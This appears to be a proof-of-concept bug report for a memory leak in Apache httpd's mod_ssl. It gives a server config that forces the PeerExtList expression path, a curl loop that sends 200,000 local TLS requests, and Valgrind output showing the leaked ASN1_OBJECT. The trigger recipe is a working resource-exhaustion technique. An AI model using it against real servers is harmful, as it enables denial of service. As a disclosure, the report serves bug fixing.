# PoC 150 — `ASN1_OBJECT` Leak On Absent Certificate

`ssl_ext_list()` allocates an `ASN1_OBJECT` via `OBJ_txt2obj()` then
returns early when the selected certificate is absent, leaking the OID
on every evaluation.

## Setup

Server cert/key (no client cert required):

```bash
mkdir -p /tmp/httpd-poc-150 && cd /tmp/httpd-poc-150
openssl req -x509 -newkey rsa:2048 -nodes -days 1 \
  -subj "/CN=localhost" -keyout server.key -out server.crt
```

`httpd.conf`:

```apache
ServerRoot "/tmp/httpd-poc-150"
PidFile "/tmp/httpd-poc-150/httpd.pid"
ErrorLog "/tmp/httpd-poc-150/error.log"
LogLevel ssl:info

Listen 127.0.0.1:8443

LoadModule mpm_event_module  modules/mod_mpm_event.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule ssl_module        modules/mod_ssl.so
LoadModule headers_module    modules/mod_headers.so

SSLEngine on
SSLCertificateFile    /tmp/httpd-poc-150/server.crt
SSLCertificateKeyFile /tmp/httpd-poc-150/server.key

# Force ssl_ext_list() down the peer-cert path with no client cert.
Header set X-Peer-Ext "expr=%{PeerExtList('2.5.29.17')}"
```

## Trigger

Drive many TLS connections without supplying a client certificate. The
expression engine evaluates `PeerExtList('2.5.29.17')`, calls
`ssl_ext_list(..., peer=1, ...)`, and the
`SSL_get_peer_certificate()` lookup returns `NULL`.

```bash
/usr/sbin/httpd -f /tmp/httpd-poc-150/httpd.conf -X &
HTTPD=$!
for i in $(seq 1 200000); do
    curl -sk https://127.0.0.1:8443/ -o /dev/null
done
ps -o rss= -p "$HTTPD"
```

## Observed effect

* RSS for the httpd worker grows monotonically: each request leaks one
  `ASN1_OBJECT` (~80 bytes plus internal allocations). After 200 000
  requests the leak is several megabytes.
* Valgrind run (single request, `httpd -X`) produces:
  ```
  definitely lost: 80 bytes in 1 blocks
     at OBJ_txt2obj
     by ssl_ext_list (ssl_engine_vars.c:1064)
  ```
* No client cert is ever sent, exercising the `xs == NULL` early return
  at `modules/ssl/ssl_engine_vars.c:1080`.
